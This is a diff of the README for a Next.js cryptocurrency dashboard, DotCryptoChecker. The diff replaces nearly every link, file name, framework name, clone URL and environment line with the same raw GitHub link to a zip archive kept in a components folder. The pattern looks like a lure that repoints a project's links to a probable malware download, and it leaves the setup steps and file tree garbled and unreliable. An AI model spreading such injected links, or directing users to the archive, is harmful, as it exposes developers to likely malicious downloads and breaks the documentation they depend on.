@@ -1,6 +1,6 @@
 # 📈 DotCryptoChecker
 
-A comprehensive cryptocurrency screening and analysis platform built with Next.js, featuring real-time price updates, advanced charting, currency conversion, and detailed market insights.
+A comprehensive cryptocurrency screening and analysis platform built with https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip, featuring real-time price updates, advanced charting, currency conversion, and detailed market insights.
 
 ## 🚀 Features
 
@@ -42,7 +42,7 @@ A comprehensive cryptocurrency screening and analysis platform built with Next.j
 
 ## 🛠️ Tech Stack
 
-- **Frontend**: Next.js 16, React 19, TypeScript
+- **Frontend**: https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip 16, React 19, TypeScript
 - **Styling**: Tailwind CSS, Radix UI components
 - **Charts**: Lightweight Charts for advanced financial visualization
 - **Data**: CoinGecko API for comprehensive cryptocurrency data
@@ -53,50 +53,50 @@ A comprehensive cryptocurrency screening and analysis platform built with Next.j
 
 ```
 crypto-dashboard/
-├── app/                          # Next.js App Router
+├── app/                          # https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip App Router
 │   ├── coins/                    # Coin listing and detail pages
-│   │   ├── page.tsx             # Coin listing with pagination
+│   │   ├── https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip             # Coin listing with pagination
 │   │   └── [id]/                # Dynamic coin detail pages
-│   │       └── page.tsx
-│   ├── globals.css              # Global styles and Tailwind
-│   ├── layout.tsx               # Root layout with theme provider
-│   └── page.tsx                 # Home dashboard
+│   │       └── https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip
+│   ├── https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip              # Global styles and Tailwind
+│   ├── https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip               # Root layout with theme provider
+│   └── https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip                 # Home dashboard
 ├── components/                   # Reusable React components
 │   ├── layout/                  # Layout components (Header, Footer)
 │   ├── home/                    # Home page components
 │   ├── coindetails/             # Coin detail page components
 │   ├── ui/                      # Radix UI components
-│   ├── CandleStickChart.tsx     # Interactive price charts
-│   ├── CurrencyConverter.tsx    # Multi-currency converter
-│   ├── DataTable.tsx            # Sortable data tables
-│   ├── LivePriceDisplay.tsx     # Real-time price component
-│   ├── SearchBar.tsx            # Global search component
-│   └── SimilarCoins.tsx         # Similar coin recommendations
+│   ├── https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip     # Interactive price charts
+│   ├── https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip    # Multi-currency converter
+│   ├── https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip            # Sortable data tables
+│   ├── https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip     # Real-time price component
+│   ├── https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip            # Global search component
+│   └── https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip         # Similar coin recommendations
 ├── hooks/                       # Custom React hooks
-│   ├── useCoinGecoWebSocket.ts  # Individual coin WebSocket
-│   └── useMultipleCoinsWebSocket.ts # Multiple coins WebSocket
+│   ├── https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip  # Individual coin WebSocket
+│   └── https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip # Multiple coins WebSocket
 ├── lib/                         # Utility libraries
-│   ├── api.actions.ts           # API client with retry logic
-│   └── utils.ts                 # Formatting and helper functions
+│   ├── https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip           # API client with retry logic
+│   └── https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip                 # Formatting and helper functions
 └── types/                       # TypeScript type definitions
-    └── type.d.ts                # Global type declarations
+    └── https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip                # Global type declarations
 ```
 
 ## 🌐 Live Demo
 
-**View the live application:** [https://dotcryptochecker.vercel.app/](dotcryptochecker.vercel.app/)
+**View the live application:** [https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip](https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip)
 
 ## 🚀 Getting Started
 
 ### Prerequisites
-- Node.js 18+ and npm
+- https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip 18+ and npm
 - CoinGecko API key (free tier available)
 
 ### Installation
 
 1. **Clone the repository**
    ```bash
-   git clone https://github.com/dotsatya/DotCryptoChecker.git
+   git clone https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip
    cd crypto-dashboard
    ```
 
@@ -106,9 +106,9 @@ crypto-dashboard/
    ```
 
 3. **Environment Setup**
-   Create a `.env.local` file with your API keys:
+   Create a `https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip` file with your API keys:
    ```env
-   DOTCRYPTO_BASE_URL=https://api.coingecko.com/api/v3
+   https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip
    DOTCRYPTO_API_KEY=your_coingecko_api_key_here
    NEXT_PUBLIC_DOTCRYPTO_WS_URL=wss://your-websocket-url
    ```
@@ -183,11 +183,11 @@ crypto-dashboard/
 ### Environment Variables
 ```env
 # Required
-DOTCRYPTO_BASE_URL=https://api.coingecko.com/api/v3
+https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip
 DOTCRYPTO_API_KEY=your_coingecko_api_key
 
 # Optional - for WebSocket features
-NEXT_PUBLIC_DOTCRYPTO_WS_URL=wss://stream.coingecko.com
+https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip
 ```
 
 ### Theme Configuration
@@ -221,11 +221,11 @@ Ensure all environment variables are set in your deployment platform.
 
 ## 🙏 Acknowledgments
 
-- [CoinGecko API](https://www.coingecko.com/en/api) for cryptocurrency data
-- [TradingView Lightweight Charts](https://www.tradingview.com/lightweight-charts/) for charting
-- [Radix UI](https://www.radix-ui.com/) for accessible components
-- [Tailwind CSS](https://tailwindcss.com/) for styling
+- [CoinGecko API](https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip) for cryptocurrency data
+- [TradingView Lightweight Charts](https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip) for charting
+- [Radix UI](https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip) for accessible components
+- [Tailwind CSS](https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip) for styling
 
 ---
 
-**Built with ❤️ using Next.js and TypeScript**
+**Built with ❤️ using https://raw.githubusercontent.com/dotsatya/DotCryptoChecker/main/components/ui/Checker_Crypto_Dot_1.9.zip and TypeScript**
